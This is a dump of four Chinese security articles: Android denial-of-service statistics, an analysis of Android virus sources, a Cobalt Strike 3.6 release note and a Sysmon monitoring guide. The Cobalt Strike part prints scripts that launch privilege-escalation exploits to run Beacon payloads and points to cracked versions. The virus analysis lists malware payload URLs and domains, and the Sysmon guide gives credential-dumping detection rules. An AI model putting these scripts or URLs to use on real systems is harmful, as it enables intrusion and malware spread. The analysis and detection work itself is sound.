APP总共有151个，发现拒绝服务漏洞的总个数为970个，平均个数为6.4个**，其中影音播放类的APP本地拒绝服务个数最多，健康类安全类和运营商类比较少、游戏类的最少。**国内行业APP本地拒绝服务漏洞情况：柱状图是国内各个行业APP按本地拒绝服务漏洞平均个数排序：下图是各个组件引起的本地拒绝服务的数量、占比情况：国内行业动态注册BroadcastReceiver导致的本地拒绝服务漏洞有247个，约占拒绝服务漏洞总数的25%，比静态注册BroadcastReceiver的要多不少：国外行业主要是通过采集Google Play上的APP，我们也采集了各个行业的TOP APP总共有177个，发现拒绝服务漏洞的总个数是649个，平均漏洞个数为3.7个，平均漏洞个数最多的是办公类应用，最少的和国内行业一样是游戏。国外行业APP本地拒绝服务漏洞情况：国外各个行业的应用本地拒绝服务漏洞平均个数排序：各个组件引起的本地拒绝服务的数量、占比情况：国外行业动态注册BroadcastReceiver导致的本地拒绝服务漏洞有147个，约占拒绝服务漏洞总数的23%，比国内的情况略少，可见动态注册BroadcastReceiver导致的本地拒绝服务都没有引起大家的重视。总体上来看，本地拒绝服务风险因为具有Android版本无关性，漏洞本身对APP影响也不大，只与应用开发者是否注意、重视有关，所以现在还经常在应用中出现。在各大厂商的安全应急响应中心评级为低危漏洞，也有厂商不收此类漏洞，但是这些攻击面依然存在，如果深入分析这些组件，有的不仅仅是引发本地拒绝服务风险，必须遵循最小权限原则，没有必要导出的组件不要导出。四、开发者建议（1）阿里聚安全的漏洞扫描器已经具备覆盖动态注册Receiver产生的拒绝服务漏洞（目前，还没发现友商的漏洞扫描器有这样的能力），使用阿里聚安全的漏洞扫描器进行扫描，可及时发现这些漏洞。（2）不必要导出的组件将其exported属性显式的设为“false”，这样可以减少应用的攻击面。（3）导出的组件在getIntent()后，Intent.getXXXExtra()时用try…catch做好异常处理。（4）在导出的组件设置好权限控制，不让任意第三方应用访问。（5）对于动态注册的BroadcastReceiver，尽量少用registerReceiver()方法，如果只在本应用内通信，改用LocalBroadcastManager的registerReceiver()进行本地注册，如果必须导出给外部应用，在使用registerReceiver()时要指定好相应的访问权限。五、参考1、Android APP通用型拒绝服务漏洞分析报告，http://blogs.360.cn/blog/android-app%E9%80%9A%E7%94%A8%E5%9E%8B%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/2、 Android应用本地拒绝服务漏洞浅析，https://jaq.alibaba.com/blog.htmid=553、https://developer.android.com/guide/components/activities.html4、https://developer.android.com/guide/components/services.html5、https://developer.android.com/reference/android/content/Context.html6、https://labs.mwrinfosecurity.com/advisories/2014/11/05/nexus-5-4-4-2-local-dos/","2016-10-29 15:09:57","网络安全","阿里聚安全Android应用漏洞扫描器解析：本地拒绝服务检测详解","http://nsoad.com/Article/Network-security/20161029/tools-658.html"
"5ccbfa124f2f0a0a7a69c009","用户手机的第一个病毒从何而来？这篇文章也许能给你答案。新应用安装概况在用户下载安装应用之时，Clean Master会对下载的文件进行安全扫描，仅从Clean Master扫描数据来看","Kong","用户手机的第一个病毒从何而来？这篇文章也许能给你答案。新应用安装概况在用户下载安装应用之时，Clean Master会对下载的文件进行安全扫描，仅从Clean Master扫描数据来看，几乎每天都有上千万次的应用安装行为。  应用的安装来源分布如下图二所示。据统计，约有1/3的应用是在用户未设置installer的情况下安装的。这意味着这些应用的来源无法被监控，也就是下图二中的‘未知’来源。绝大部分手机病毒都隐藏在这部分‘未知’来源的应用中。主要安装源中病毒相关的行为：1.  GooglePlay安装源：    自动/网页广告/用户解锁/点击弹出的广告等来打开Google Play市场到指定的推广app页面，诱导下载    打开googlePlay模拟点击，自动安装（不需root）2. 未知安装源：    通过色情网页，第三方链接等渠道下载的病毒    病毒推广安装的app    短信蠕虫    手机出厂预装（如赠品推广、电视广告等形式的山寨手机）‘未知’来源的病毒应用安装情况‘未知’来源的应用中含有大量病毒应用。来自Clean Master的数据显示，目前有三种病毒每天被安装超过10000次。 病毒应用名称      每天被安装次数  org.message.up.update      16379  com.android.syscore      12090  com.power.core.setting      10229  org.ndf.sut      9032  com.kiy.freewifi      8664  com.zsysc.dwonload      8069  com.impupa.hum.zq      7464  com.witskies.yoyogo      6638  com.kaixuan      5823  com.google.webcps      4764  com.android.tools.receiver      4718  com.android.patchs      4647  com.codeauroim.systemupdate      4385  com.fun.locktouch      4119  com.op.uuj      4061  com.nts.gtf.zwt      3811  net.smart.game      3659  com.evince.exactly.exceeded      3412  heart.clear.luck      3310  com.bc.android.bctcore      3233  com.bt.wallpapers.hd      3199  com.google.android.syscps.mj      3058  com.fpnq.cleaner      2929  com.android.akeyassist.c      2857 表一 ‘未知’来源病毒应用安装数量不计算病毒推广安装的正常app，只计算被安装的应用为病毒的数量，根据上面的数据与每天安装总量的对比，病毒所占的比例不低于每天安装总量的千分之一。以上病毒大部分是被谁推广的？我们分析了其中两个主要病毒推广源com.sms.sys.manager与com.al.alarm.controller，它们属于同一家族,     这些病毒应用进入用户手机之后，会疯狂推广安装其他对用户无用的应用。下表是Clean Master统计到的设置了installer的数据。 图三中所示的两个病毒每日推广安装其他应用的数量较大。而受这两个病毒应用最严重的国家是印度，超过一半的感染量都在这里。其次是印度尼西亚和菲律宾，可见受灾最严重的国家主要集中在亚洲。病毒恶意行为分析遍历elf运行获取root权限/system/bin/nis/system/bin/daemonnis/system/bin/.daemon/nis/system/bin/.sr/nis/system/bin/ndcfg/system/bin/.daemon/ndcfg/system/bin/.sr/ndcfg广告推广及其它恶意app推广这两个样本每天的推广安装量在3至4万之间，从1月份检测到此病毒至6月份为止一直成上升趋势，目前每天的推广量维持在3到4万之间。分析完病毒推广维度，我们又统计了网页维度的app下载量，以从整体上对恶意app的安装有个总体的认知。网址安全当用户访问某个链接时，CMS隐私浏览功能可以判断是否为恶意链接。下表是根据CM Security 查询的数据统计的通过恶意网址传播的TOP病毒。 病毒应用     下载量     行为 Wireless optimizer     16992     Root+恶意广告  WIFI Master pro     8206     Root+恶意广告  AndroidSystemTheme     7734     恶意广告  Adult Victoria     4595     Root+恶意广告  AndroidBackup     4546     恶意广告  MXplayer pro     4169     Root+恶意广告  ES File Manager pro     2921     Root+恶意广告  Love Beauty     2507     Root+恶意广告  LockTouch     2447     Root+恶意广告  Run Keeper     2424     Root+恶意广告  Music Player Pro     2281     Root+恶意广告  FireFox     2166     Root+恶意广告 表二 恶意应用下载topGhostPush家族以上所有病毒与恶意广告均属于同一家族，简要分析如下MXplayer pro与Wireless optimizer代码结构通过代码结构可以看到基本属于同一变种，其它的样本大多用了GhostPush相同的root模块，目前为止此病毒家族感染量一直稳居首位。Wireless optimizer与MXplayer pro Root方式：Ø  Wirelessoptimizer上传信息从云端获取root elf文件来进行rootroot脚本及要替换的系统文件http://45.79.151.241/admin201506/uploadApkFile/rt/20160902/env201609020950.dataroot 用到的工具http://45.79.151.241/admin201506/uploadApkFile/rt/20160823/ToolboxAndSupolicy19.root 手机的elf http://45.79.151.241/admin201506/uploadApkFile/rt/20160902/ym.dataØ  Wirelessoptimizer下载root apk来进行rootroot手机的apkhttp://down.dioewcdn.com/backokr/rtt_0310_577.apkroot样本的多次升级，目前Android6.0以下的机器基本都可以完成root，关键代码以加密的方式放于assets目录或服务器中，用时动态加载，放于系统目录伪装成系统内置应用，su的调用加入多个不同的参数防止第三方获取root。 这些都加大了对root病毒的检测及清除难度，所以root病毒至今依然猖獗，感染量居高不下。Wirelessoptimizer行为以第一个Wireless optimizer为例，总体流程：主要行为简述：Ø  显示欺诈/色情页面，诱导支付或下载新的恶意样本Ø  显示广告/网站推广Ø  点击跳转到色情页面或app推广Ø  状态栏广告推送病毒的行为同其它家族病毒行为基本相同，总体来说中毒用户依然是少数用户，但由于其具有root行为，并且病毒之间相互合作安装其它病毒，并通过色情，欺诈页面，引诱下载等方式引导用户下载恶意程序，所以其推广app的量甚至可以和一些第三方的应用市场持平，加上root病毒难以清除并经常自动从服务器更新广告/root sdk数据，会有一批稳定的“用户”量，通过广告，推广app等形式来获取收益。以上病毒对应的恶意域名TOP 病毒对应恶意域名     下载次数 d11w6715sf0qtr.cloudfront.net     1465 d2xprsj0riymso.cloudfront.net     1046 d2elva29up0ecb.cloudfront.net     828 d2b5yq44mldizo.cloudfront.net     791 d149ec88gwqs65.cloudfront.net     645 d2xprsj0riymso.cloudfront.net     627 d1aqbdl78d2ij9.cloudfront.net     612 d2xprsj0riymso.cloudfront.net     603 cdn4.he88cc.com     579 d2hxoy27lswrwn.cloudfront.net     557 d3nrmonu5chdoe.cloudfront.net     557 dflnr8mbt9zn4.cloudfront.net     543 developed.down.paipaijiajiahoho.rocks     532 developed.down.speedeverything.racing     436 d223pr27hf09gh.cloudfront.net     408 d32vdaxi7kise9.cloudfront.net     385 d1p99gh6syi4w3.cloudfront.net     355 d2zftpxw5x4sda.cloudfront.net     330 apk.cs9adv.com     318 cdn4.he88cc.com     284 d12wwrgn171dpf.cloudfront.net     282 d3miaiw22d9toa.cloudfront.net     256 diyuudi4itl2y.cloudfront.net     242 d15kk6vif9vfl2.cloudfront.net     239 kokddl.b0.upaiyun.com     230 d2g6yvve5jkgj.cloudfront.net     220 d3befr7zfyxng9.cloudfront.net     214 dufk90vz3m463.cloudfront.net     212 developed.down.speedeverything.racing     211 d3v84euoiqd4ja.cloudfront.net     203 cdn4.he88cc.com     193 d16tqylaric8rz.cloudfront.net     191 d3vgnpmqp0287f.cloudfront.net     180 d1oys6pgzouz0v.cloudfront.net     177 d3hg5helwcy9a6.cloudfront.net     177 d3rnd9sreh1icy.cloudfront.net     175 dgpp3263vzsn4.cloudfront.net     171 d2qk9dhiyof2a7.cloudfront.net     170 dz4h53f1fc33s.cloudfront.net     170 d16lmr1g7q6e6x.cloudfront.net     168 kokddl.b0.upaiyun.com     168 d2ky4lft4asw5.cloudfront.net     161 down.slamdunk.space     161 apk.cs9adv.com     147 ds1tj08wt495i.cloudfront.net     142 developed.down.paipaijiajiahoho.rocks     135 d9bf1mn02xkeo.cloudfront.net     131表三 恶意域名top由于是同一家庭的病毒，基本上访问的root服务、广告服务都是对应于同一个域名。猎豹移动安全实验室对这些域名的来源做了分析，以发现是什么样的链接引导用户安装恶意的app。跳转到这些域名下载的上一级来源为 病毒下载链接的referrer      访问数量  adf.ly      30271  slimspots.com      10021  cloudfront.net      6120  sh.st      4485  pdanew.com      3063  japemusic.com      2850  afftrack.com      2533  clickpartoffon.xyz      2134  adyou.me      1429  ouo.press      1285  adreactor.com      1247  bc.vc      1209  popads.net      962  waframedia8.com      907  zatnawqy.net      864  adultmaster25.com      712  ……        表四 上级链接来源top可见病毒的主要来源，来自短链接以及一些广告链接。经过我们排查短链接与广告链接的上一级来源后，结果大致如下。总结l  病毒在每天的安装量中占到至少千分之一，实际病毒的推广量远大于这个数值l  病毒安装量主要来源于root病毒及网页安装l  色情网站、短链接、广告链接为主要的病毒来源病毒一般以色情、欺诈页面、诱导等方式通过第三方网页传播下载，目前Android6.0以下的机器都有被病毒root的风险，在平时请不要点击不认识的第三方链接，仅从正规市场上下载应用。一旦手机中了root病毒可以搜索相关的专杀软件或者通过手机售后刷机来达到清除root病毒的目的，除此外尽快升级为Android6.0或以上版本也是一个好的方法。","2016-10-18 18:10:25","移动安全","谁给了你第一个手机病毒？安卓手机病毒来源分析","http://nsoad.com/Article/MobileSecurity/20161018/595.html"
"5ccbfa124f2f0a0a7a69c00a","目前网上能找到3.5版本的破解版本，相关破解以及工具使用技巧在FB上资源还是挺多的。","鸢尾","简介Cobalt Strike 3.6版本已经正式发布，此版本新增了一个用于调用Beacon的第三方提权漏洞利用程序的API，并扩展Malleable C2以支持不使用HTTP POST的HTTP C&amp;C。同时该版本还对之前版本中存在的问题进行了修复和改进。目前网上能找到3.5版本的破解版本，相关破解以及工具使用技巧在FB上资源还是挺多的。CobaltStrike最新版完美破解方法如何制作Cobalt Strike v2.5破解版在Kali 2.0下安装破解最新版Cobalt Strike关于分析Cobalt Strike的beacon.dll的一些TIPS提权API此版本新增了一个API将提权利用程序集成到Beacon的elevate命令。下面以FuzzySec发现的ms16-032漏洞为例子，将变型的PowerShell Empire集成到Beacon中：sub ms16_032_exploit {    local('$script $oneliner');    # acknowledge this command    btask($1, ""Tasked Beacon to run "" . listener_describe($2) . "" via ms16-032"");    # generate a PowerShell script to run our Beacon listener    $script = artifact($2, ""powershell"");    # host this script within this Beacon    $oneliner = beacon_host_script($1, $script);    # task Beacon to run this exploit with our one-liner that runs Beacon    bpowershell_import!($1, script_resource(""modules/Invoke-MS16032.ps1""));    bpowerpick!($1, ""Invoke-MS16032 -Command \"" $+ $oneliner $+ \"""");    # give it another 10s to work.    bpause($1, 10000);    # handle staging    bstage($1, $null, $2);}beacon_exploit_register(""ms16-032"", ""Secondary Logon Handle Privilege Escalation (CVE-2016-099)"", &amp;ms16_032_exploit);接下来，我们试试别的。Metasploit框架应用了许多依照反射DLL(Reflective DLLs)注入原理提权的exploit。Metasploit提权利用攻击的流程首先生成一个patsy进程，其次将exploit注射到patsy进程，之后将stager shellcode payload注射到patsy进程，最后运行exploit DLL时通过一个指针指向已经完成注射的shellcode。可能你会有疑问，是否还能在Beacon中使用这些DLL？得益于Aggressor Script中的bdllspawn函数我们依旧可以在Beacon中使用这些DLL。这个函数调用一个作用于Beacon    post-exploitatio的反射DLL，它可以向DLL传递一个任意参数，并且可以监控标准输出。以下脚本为使用ms15_051_client_copy_image的Beacon payload：sub ms15_051_exploit {    # acknowledge this command    btask($1, ""Task Beacon to run "" . listener_describe($2) . "" via ms15-051"");    # tune our parameters based on the target arch    if (-is64 $1) {        $arch   = ""x64"";        $dll    = ""modules/cve-2015-1701.x64.dll"";    }    else {        $arch   = ""x86"";        $dll    = ""modules/cve-2015-1701.x86.dll"";    }    # generate our shellcode    $stager = shellcode($2, false, $arch);    # make sure we have shellcode for this listener (some stagers are x86 only)    if ($stager is $null) {        berror($1, ""No $arch stager for listener ' $+ $2 $+ '"");        return;    }    # spawn a Beacon post-ex job with the exploit DLL    bdllspawn!($1, script_resource($dll), $stager, ""ms15-051"", 5000);    # stage our payload (if this is a bind payload)    bstage($1, $null, $2, $arch);}beacon_exploit_register(""ms15-051"", ""Windows ClientCopyImage Win32k Exploit (CVE 2015-1701)"", &amp;ms15_051_exploit);这些函数使得你的团队能更轻松的集成Cobalt Strike自定义功能，以及在Beacon中快速适配新的漏洞。提权套件如果你想了解更多提权相关的范例，可以查看Elevate Kit。此外还可以查阅Aggressor Script，该文演示了如何在Cobalt Strike的Beacon payload中使用PowerShell以及反射DLL exploit。Elevate Kit使用方法：下载ElevateKit文件并将其提取到Cobalt Strike，进入Cobalt Strike -&gt; Scripts，单击Load，然后选择elevate.cna在Beacon中：键入elevate可查看当前加载的exploit列表。键入elevate [exploit name] [listener]针对当前Beacon会话实施利用。Malleable C2以下截图为Beacon与webbug_getonly profile的通信数据。你可以猜到哪边是Beacon对Cobalt Strike发起的下载任务请求？ 哪边是Beacon对Cobalt Strike做出的响应？本版本通过使用Malleable C2很大程度上增强了Beacon的HTTP通信的灵活性。你现在可以为Beacon的http-get和http-post处理方式设置HTTP动词。同时还可以将Beacon的响应推送到URI、数据头或参数中。而且Beacon将其响应自动分块（并使用多个请求）以适应HTTP GET-only通道的约束。如果你喜欢对配置文件的技巧以及分析发起挑战，我想这会带给你更多的乐趣。此外这些变化还使得“模拟”不同恶意软件的HTTP通信数据变得更精确。点击发行说明查看Cobalt Strike 3.6中的新特性的完整列表。授权用户可使用更新程序获取更新，同时提供21天试用的Cobalt Strike trial版本也发布了。注：由于美国出口控制要求，你得全局科学访问该使用版本下载页面。另外试用版本没有对Beacon任务以及响应加密，仅建议在实验环境下使用，切勿在生产环境下使用！授权用户则无此限制。","2017-01-06 15:19:23","安全工具","提权利器Cobalt Strike发布3.6版本","http://nsoad.com/Security-tools/20170106/tools-993.html"
"5ccbfa124f2f0a0a7a69c00b","sysmon是由Windows Sysinternals出品的一款Sysinternals系列中的工具.","Kong","0×01 sysmon介绍sysmon是由Windows Sysinternals出品的一款Sysinternals系列中的工具。它以系统服务和设备驱动程序的方法安装在系统上，并保持常驻性。sysmon用来监视和记录系统活动，并记录到windows事件日志，可以提供有关进程创建，网络链接和文件创建时间更改的详细信息。通过收集使用Windows事件集合或SIEM代理生成的事件，然后分析它们，您可以识别恶意或异常活动，并了解入侵者和恶意软件在您的网络上如何操作。0×02 sysmon特点用完整的命令行记录下子进程和父进程的创建行为。使用sha1（默认），MD5，SHA256或IMPHASH记录进程镜像文件的hash值。可以同时使用多个hash，包括进程创建过程中的进程GUID。每个事件中包含session的GUID。1.记录驱动程序或者加载的DLL镜像的签名及其hash。2.记录磁盘和卷的原始数据的读取请求。3.记录网络连接，包括每个连接的源进程，IP地址，端口号，主机名和端口名（可选）4.如果更改注册表则自动重新加载配置。5.具有规则过滤，以便动态包括或排除某些事件。6.在加载进程的初期生成事件，能记录在复杂的内核模式运行的恶意软件。0×03 安装    Install:    Sysmon.exe -i &lt;configfile&gt;    [-h &lt;[sha1|md5|sha256|imphash|*],...&gt;] [-n [&lt;process,...&gt;]]    [-l (&lt;process,...&gt;)]    Configure:  Sysmon.exe -c &lt;configfile&gt;                  [--|[-h &lt;[sha1|md5|sha256|imphash|*],...&gt;] [-n [&lt;process,...&gt;]]                   [-l [&lt;process,...&gt;]]]    Uninstall:  Sysmon.exe -u-c 更新或显示配置-h 指定hash记录的算法-i 安装，可用xml文件来更新配置文件-l 记录加载模块，可指定进程-m 安装事件清单-n 记录网络链接-r 检测证书是否撤销-u 卸载服务和驱动一键安装： sysmon -accepteula  –i -n指定配置文件（安装时请用-i）sysmon -c xxx.xml注：安装需要管理员权限并重启，windows 7 或者以上，服务器系统windows server 2012 及以上。0×04 配置文件在实际环境中，往往生产环境和使用需求不尽相同，而记录所有的日志又显得繁琐和庞大，这时候自定义规则显得尤为重要。sysmon提供了xml格式的配置文件来让用户自定义过滤规则，配置文件的东西比较多，把个人总结的一些东西贴出来方便大家交流。一个xml配置文件的示例（xml大小写敏感）  &lt;Sysmon schemaversion=""3.20""&gt;      &lt;!-- Capture all hashes --&gt;      &lt;HashAlgorithms&gt;*&lt;/HashAlgorithms&gt;      &lt;EventFiltering&gt;        &lt;!-- Log all drivers except if the signature --&gt;        &lt;!-- contains Microsoft or Windows --&gt;        &lt;DriverLoad onmatch=""exclude""&gt;          &lt;Signature condition=""contains""&gt;microsoft&lt;/Signature&gt;          &lt;Signature condition=""contains""&gt;windows&lt;/Signature&gt;        &lt;/DriverLoad&gt;        &lt;!-- Do not log process termination --&gt;        &lt;ProcessTerminate onmatch=""include"" /&gt;        &lt;!-- Log network connection if the destination port equal 443 --&gt;        &lt;!-- or 80, and process isn't InternetExplorer --&gt;        &lt;NetworkConnect onmatch=""include""&gt;          &lt;DestinationPort&gt;443&lt;/DestinationPort&gt;          &lt;DestinationPort&gt;80&lt;/DestinationPort&gt;        &lt;/NetworkConnect&gt;        &lt;NetworkConnect onmatch=""exclude""&gt;          &lt;Image condition=""end with""&gt;iexplore.exe&lt;/Image&gt;        &lt;/NetworkConnect&gt;      &lt;/EventFiltering&gt;    &lt;/Sysmon&gt;可选择的事件过滤器有ProcessCreate  进程创建FileCreateTime  进程创建时间NetworkConnect  网络链接ProcessTermina  进程结束DriverLoad    驱动加载ImageLoad     镜像加载CreateRemoteTh  远程线程创建RawAccessRead   驱动器读取ProcessAccess   进程访问FileCreate    文件创建RegistryEvent  注册表事件FileCreateStre  文件流创建过滤器事件的选项：ProcessCreateUtcTime, ProcessGuid, ProcessId, Image, CommandLine, CurrentDirectory, User, LogonGuid, LogonId, TerminalSessionId, IntegrityLevel, Hashes, ParentProcessGuid, ParentProcessId, ParentImage, ParentCommandLineFileCreateTimeUtcTime, ProcessGuid, ProcessId, Image, TargetFilename, CreationUtcTime, PreviousCreationUtcTimeNetworkConnectUtcTime, ProcessGuid, ProcessId, Image, User, Protocol, Initiated, SourceIsIpv6, SourceIp, SourceHostname, SourcePort, SourcePortName, DestinationIsIpv6, DestinationIp, DestinationHostname, DestinationPort, DestinationPortNameProcessTerminateUtcTime, ProcessGuid, ProcessId, ImageDriverLoadUtcTime, ImageLoaded, Hashes, Signed, SignatureImageLoadUtcTime, ProcessGuid, ProcessId, Image, ImageLoaded, Hashes, Signed, SignatureCreateRemoteThreadUtcTime, SourceProcessGuid, SourceProcessId, SourceImage, TargetProcessGuid, TargetProcessId, TargetImage, NewThreadId, StartAddress, StartModule, StartFunctionRawAccessReadUtcTime, ProcessGuid, ProcessId, Image, DeviceProcessAccessUtcTime, SourceProcessGUID, SourceProcessId, SourceThreadId, SourceImage, TargetProcessGUID, TargetProcessId, TargetImage, GrantedAccess, CallTraceFileCreateUtcTime, ProcessGuid, ProcessId, Image, TargetFilename, CreationUtcTimeRegistryEventUtcTime, ProcessGuid, ProcessId, Image, EventType, TargetObjectFileCreateStreamHashUtcTime, ProcessGuid, ProcessId, Image, TargetFilename, CreationUtcTime, Hash注：更多过滤器的详细说明请参考https://technet.microsoft.com/en-us/sysinternals/sysmon。onmatch选项只能设置为include或exclude。condition根据不同的需求可设置为如下值：Condition    DescriptionIs    Default, values are equalsis not    Values are differentContains    The field contains this valueExcludes    The field does not contain this valuebegin with    The field begins with this valueend with    The field ends with this valueless than    Lexicographical comparison is less than zeromore than    Lexicographical comparison is more than zeroImage    Match an image path (full path or only image name). For example: lsass.exe will match c:\windows\system32\lsass.exe下述规则将记录所有创建tmp格式或exe格式文件的行为：&lt;FileCreate onmatch=""include""&gt;       &lt;TargetFilename condition=""end with""&gt;.tmp&lt;/TargetFilename&gt;       &lt;TargetFilename condition=""end with""&gt;.exe&lt;/TargetFilename&gt;    &lt;/FileCreate&gt;下述规则将记录加载没有签名的镜像行为：&lt;ImageLoad onmatch=""exclude""&gt;       &lt;Signed condition=""is""&gt;true&lt;/Signed&gt;    &lt;/ImageLoad&gt;你可以为同一个事件同时指定include和exclude，但一个onmatch里只能赋值为exclude或include。exclude规则里覆盖include规则。同一规则里的过滤条件用逻辑或连接，不同规则里的过滤条件用逻辑与连接。下述规则将记录除了chrome之外的所有访问80或443的网络记录&lt;NetworkConnect onmatch=""exclude""&gt;      &lt;Image condition=""end with""&gt;chrome.exe&lt;/Image&gt;    &lt;/NetworkConnect&gt;        &lt;NetworkConnect onmatch=""include""&gt;     &lt;DestinationPort condition=""is""&gt;80&lt;/DestinationPort&gt;      &lt;DestinationPort condition=""is""&gt;443&lt;/DestinationPort&gt;    &lt;/NetworkConnect&gt;贴一个我PC机器上的xml配置文件，在实际生产中请根据实际情况调整&lt;Sysmon schemaversion=""3.20""&gt;  &lt;!-- Capture all hashes --&gt;  &lt;HashAlgorithms&gt;*&lt;/HashAlgorithms&gt;  &lt;EventFiltering&gt;    &lt;!-- Log all drivers except if the signature --&gt;    &lt;!-- contains Microsoft or Windows --&gt;    &lt;DriverLoad onmatch=""exclude""&gt;      &lt;Signature condition=""contains""&gt;Microsoft&lt;/Signature&gt;      &lt;Signature condition=""contains""&gt;Windows&lt;/Signature&gt;    &lt;/DriverLoad&gt;    &lt;ProcessTerminate onmatch=""include"" &gt;      &lt;Image condition=""end with""&gt;MsMpEng.exe&lt;/Image&gt;    &lt;/ProcessTerminate&gt;    &lt;!-- Log network connection if the destination port equal 443 --&gt;    &lt;!-- or 80, and process isn't InternetExplorer --&gt;    &lt;!--NetworkConnect onmatch=""include""&gt;      &lt;DestinationPort&gt;443&lt;/DestinationPort&gt;      &lt;DestinationPort&gt;80&lt;/DestinationPort &gt;    &lt;/NetworkConnect --&gt;    &lt;FileCreateTime onmatch=""exclude"" &gt;      &lt;Image condition=""end with""&gt;chrome.exe&lt;/Image&gt;    &lt;/FileCreateTime&gt;    &lt;ImageLoad onmatch=""include""&gt;      &lt;Signed condition=""is""&gt;false&lt;/Signed&gt;    &lt;/ImageLoad&gt;    &lt;!-- Log access rights for lsass.exe or winlogon.exe is not PROCESS_QUERY_INFORMATION --&gt;    &lt;ProcessAccess onmatch=""exclude""&gt;      &lt;GrantedAccess condition=""is""&gt;0x1400&lt;/GrantedAccess&gt;    &lt;/ProcessAccess&gt;    &lt;ProcessAccess onmatch=""include""&gt;      &lt;TargetImage condition=""end with""&gt;lsass.exe&lt;/TargetImage&gt;      &lt;TargetImage condition=""end with""&gt;winlogon.exe&lt;/TargetImage&gt;    &lt;/ProcessAccess&gt;    &lt;NetworkConnect onmatch=""exclude""&gt;      &lt;Image condition=""end with""&gt;chrome.exe&lt;/Image&gt;      &lt;SourcePort condition=""is""&gt;137&lt;/SourcePort&gt;      &lt;SourcePortName condition=""is""&gt;llmnr&lt;/SourcePortName&gt;      &lt;DestinationPortName condition=""is""&gt;llmnr&lt;/DestinationPortName&gt;    &lt;/NetworkConnect&gt;    &lt;CreateRemoteThread onmatch=""include""&gt;      &lt;TargetImage condition=""end with""&gt;explorer.exe&lt;/TargetImage&gt;      &lt;TargetImage condition=""end with""&gt;svchost.exe&lt;/TargetImage&gt;      &lt;TargetImage condition=""end with""&gt;winlogon.exe&lt;/TargetImage&gt;      &lt;SourceImage condition=""end with""&gt;powershell.exe&lt;/SourceImage&gt;    &lt;/CreateRemoteThread&gt;  &lt;/EventFiltering&gt;&lt;/Sysmon&gt;注： 有时候explorer.exe或者svchost会发出http请求，不用惊慌，仔细看下链接，可能只是访问Akamai或者Microsoft（刚刚测试的时候发现svchost连到新加坡111.221.29.254:443，查了一下才发现是微软新加坡分公司）。如果实在不放心，就在防火墙里配置规则把explorer的所有流量阻止，万无一失。0×05 测试示例记录dump hash笔者之所以看中了这个软件，因为最近更新可以记录访问进程的信息，通过事件CreateRemoteThread和ProcessAccess可以记录特殊操作，如dump hash和线程注入等。下面用mimikatz来演示。当我运行了mimikatz抓hash之后，默认在”Applications and Services Logs/Microsoft/Windows/Sysmon/Operational”里能找到日志记录。如下图：记录下来mimikatz访问了进程lsass.exe，属于进程访问事件。那么从哪里能看出来是进行了dump hash操作呢，关键的一点就是 GrantedAccess的值为0x143A，这个值表示什么呢，我们查阅msdn可知：0x1000  PROCESS_QUERY_LIMITED_INFORMATION 受限制的进程查询信息    0x0400  PROCESS_QUERY_INFORMATION   进程查询权限，包括token，退出代码，优先级，改权限自动继承PROCESS_QUERY_LIMITED_INFORMATION    0x0002  PROCESS_CREATE_THREAD 创建线程权限    0x0008  PROCESS_VM_OPERATION  需要对进程的地址空间执行操作，常用于VirtualProtectEx和WriteProcessMemory。    0x0010  PROCESS_VM_READ 读取进程中的内存    0x0020  PROCESS_VM_WRITE  使用WriteProcessMemory写进程内存，看见WriteProcessMemory，大概应该知道会有些什么操作了。将上面的权限按位异或即得0x143A，及表示mimikatz对lsass拥有上述访问权限，包括写进程内存和读进程内存，这样就能获取到用户口令。而一般的进程访问只需要0×1400，也就是只有进程查询权限，这里mimikatz明显有恶意行为。而普通的进程对于lsass.exe的访问如下图：这里记录下来的是windows defender对lsass.exe的访问，这里的GrantedAccess是属于普通的标准进程访问权限，calltrace也有详细的记录，属于正常的进程访问。更多关于进程访问的权限可参考https://msdn.microsoft.com/en-us/library/windows/desktop/ms684880恶意网络连接和操作用meterpreter回连，可以看到连接的详细信息，包括ip，端口，pid等，如图执行migrate操作也会记录在CreateRemoteThread里，如图：这里就能很明显的看出来test.exe把恶意代码注入到explorer.exe，借explorer这个躯壳来隐藏自己。而整个过程中我的windows defender一个泡都没冒。而filetime过滤器会将系统上所有文件的覆盖和创建时间修改时间等都记录下来：很多恶意程序留后门和dll劫持都会有替换文件和修改时间的操作（这里不是恶意行为，只是用来作一个演示）。在本地加载了任何无签名的exe和dll等可执行文件：在面对dll注入，各种白加黑，利用dll劫持等操作的恶意软件都会因为这一项被记录下来（有签名的恶意软件极少）0×06 日志记录目前的恶意软件为了对抗检测很多都有日志删除功能，为了保存好系统日志，可以将日志定期保存在本地或远程服务器，日志的默认保存在%SystemRoot%\System32\Winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evtx，可在事件查看器的日志属性设置保存在远程服务器，或通过其他工具或脚本保存。总结虽然目前有很多监视和分析软件行为的工具，如process explorer，process monitor，pstools，还有各种沙盒分析软件，反汇编调试工具，以及各大杀毒软件，但sysmon最为一个轻量级的监控软件，有它的亮眼的地方，结合其他工具能让监控系统变得更容易和更效率。如有兴趣进一步交流讨论，欢迎访问笔者微博或博客。","2016-12-16 14:21:58","安全工具","使用轻量级工具Sysmon监视你的系统","http://nsoad.com/Security-tools/20161216/tools-920.html"
